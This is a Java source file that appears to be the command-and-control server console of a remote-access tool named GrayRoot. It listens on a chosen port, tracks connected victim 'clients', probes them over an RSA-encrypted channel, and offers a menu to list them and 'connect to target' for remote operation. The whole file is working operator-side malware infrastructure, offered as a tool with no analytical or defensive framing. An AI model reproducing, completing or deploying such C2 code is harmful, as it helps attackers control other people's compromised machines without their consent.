package eu.grayroot.grayserver;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import eu.grayroot.grayserver.cipher.RSA;

public class Main {

	public static List<Socket> sockets;
	public static Server server;
	public static PublicKey publicKey;
	public static PrivateKey privateKey;

	private static void connect(Server server) throws IOException, NoSuchAlgorithmException, InvalidKeySpecException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException {
		System.out.println("\n Select Target ID [0..99+]: ");
		check(server);
		int selected = Integer.parseInt(new BufferedReader(new InputStreamReader(System.in)).readLine());
		System.out.println("Loading selected client...");
		if(selected < sockets.size() && sockets.get(selected) != null) {
			Socket selectedSocket = sockets.get(selected);
			System.out.println("Loading " + sockets.get(selected).getRemoteSocketAddress().toString().replace("/", "") + "...");
			if(server.getmap().get(selectedSocket) != null) {
				System.out.println("Loaded " + selectedSocket.getRemoteSocketAddress().toString().replace("/", "") + " !");
				Streams selectedstreams = server.getmap().get(selectedSocket);
				Connections connected = new Connections(selectedstreams);
				System.out.println("Connected to target : " + selectedSocket.getRemoteSocketAddress());
				connected.execute();
			} else {
				System.err.println("Unable to connect to " + sockets.get(selected).getRemoteSocketAddress().toString().replace("/", "") + "!");
			}
		} else {
			System.err.println("Invalid Target ID");
		}
	}
	public static void main(String[] args) throws IOException, InterruptedException {
		banner();
		sockets = new ArrayList<Socket>();
		publicKey = new RSA().loadPublicKey();
		privateKey = new RSA().loadPrivateKey();
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		String portStr = null;
		System.out.println("Enter your port : ");
		portStr = br.readLine();
		int port = Integer.parseInt(portStr);
		System.out.println("Connected Port : " + port);
		try {
			server = new Server(port);
			server.startserver();
			BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
			String sel = "";	
			while (!sel.equals("e")) {
				System.out.println("\n(" + sockets.size() + ") Choose an opreation to execute : \n"
						+ " (1)- Disconnect CNC"
						+ " \n (2)- List clients"
						+ " \n (3)- Connect to a client"
						+ " \n (4)- Exit");
				sel = reader.readLine();
				switch (sel) {
				case "1":
					if (!server.isRunning()) {
						System.err.println("Server already idle");
						System.err.flush();
						break;
					} else {

						server.stopserver();
						break;
					}

				case "2":
					if (!server.isRunning()) {
						System.err.println("Server already idle");
						System.err.flush();
						break;
					}
					check(server);
					break;

				case "3" :
					if (!server.isRunning()) {
						System.err.println("Server already idle");
						System.err.flush();
						break;
					}
					connect(server);
					break;

				case "4": 
					server.isRunning();
					server.stopserver();
					reader.close();
					break;

				default:
					break;
				}
			}
		} catch (Exception e) {
			System.err.println("\nServer exception!\n"); e.printStackTrace();
		}	
	}

	private static void check(Server server) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
		ConcurrentHashMap <Socket,Streams> map = server.getmap();
		int i = 0;
		for (Socket s : map.keySet()) {
			
			if(!map.get(s).sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("CHECK", publicKey))) || map.get(s).ReadMsg() == null) {
				System.out.println(ConsoleColors.RED + "[-] " + s.getRemoteSocketAddress().toString().replace("/", "") + ConsoleColors.RESET);
				System.err.flush();
				map.remove(s);
				sockets.remove(s);
			} else {
				System.out.println(i + ") " + s.getRemoteSocketAddress());
				i++;
			}
		}
	}

	private static void banner() {
		System.out.println(ConsoleColors.RED_BOLD_BRIGHT + " _____                ______            _   \n" + 
				"|  __ \\               | ___ \\          | |  \n" + 
				"| |  \\/_ __ __ _ _   _| |_/ /___   ___ | |_ \n" + 
				"| | __| '__/ _` | | | |    // _ \\ / _ \\| __|\n" + 
				"| |_\\ \\ | | (_| | |_| | |\\ \\ (_) | (_) | |_ \n" + 
				" \\____/_|  \\__,_|\\__, \\_| \\_\\___/ \\___/ \\__|\n" + 
				"                  __/ |                     \n" + 
				"                 |___/                      " + ConsoleColors.RESET);
		System.out.println("[-----------------------------------------------------]");
		System.out.println("[ Version     : 1.0                                   ]");
		System.out.println("[ Created by    : GrayR0ot                            ]");
		System.out.println("[-----------------------------------------------------]\n");

	}
}
